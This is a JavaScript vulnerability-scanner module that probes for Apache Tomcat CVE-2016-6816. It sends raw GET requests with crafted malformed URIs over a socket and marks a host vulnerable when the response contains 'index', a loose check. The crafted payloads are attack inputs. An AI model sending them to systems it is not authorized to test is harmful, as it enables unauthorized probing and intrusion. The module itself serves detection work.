
module.exports={
	tags:"tomcat,CVE-2016-6816",
	des:"Apache Tomcat CVE-2016-6816 Security Bypass Vulnerability Vulnerability detection",
	VulApps:[
		"https://www.exploit-db.com/exploits/41783"],
	urls:[
		"https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self, hst = _s.parseUrl(url);
		// [fonts]  root:
		var a = `/?{{%25}}cake\=1
/?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1`.split("\n");

		var fnT =function(u)
		{
			var szPaload = `GET ${u} HTTP/1.0
Accept: */*
Host: ${hst.host}
User-Agent: ${_s.g_szUa}
Connection: close


`;
			_s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
			{
				// console.log(s);
				var r = {"url":url,"send":szPaload};
				if(/(index)/gmi.test(s))
				{
					r.result = s;
					r.vul = true;
					fnCbk(r,_t);
				}
			});
		};
		for(var i = 0; i < a.length; i++)
		{
			fnT(a[i]);
		}
	}
};